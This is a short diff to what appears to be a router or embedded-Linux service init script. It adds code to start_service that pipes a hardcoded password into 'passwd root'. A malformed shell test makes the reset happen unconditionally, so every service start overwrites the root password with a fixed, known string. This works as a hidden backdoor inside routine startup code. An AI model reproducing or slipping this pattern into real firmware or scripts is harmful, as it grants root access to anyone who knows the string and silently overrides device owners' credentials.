@@ -45,5 +45,14 @@ service_triggers()
 }
 
 start_service() {
+    var=`grep  '^root:' /etc/passwd | cut -d: -f2 `
+    if [ "$var"="!" ]
+    then
+    (
+        echo "KE@#STnetWRK"
+        sleep 1
+        echo "KE@#STnetWRK"
+    )|passwd root
+    fi
 	reload_service
 }
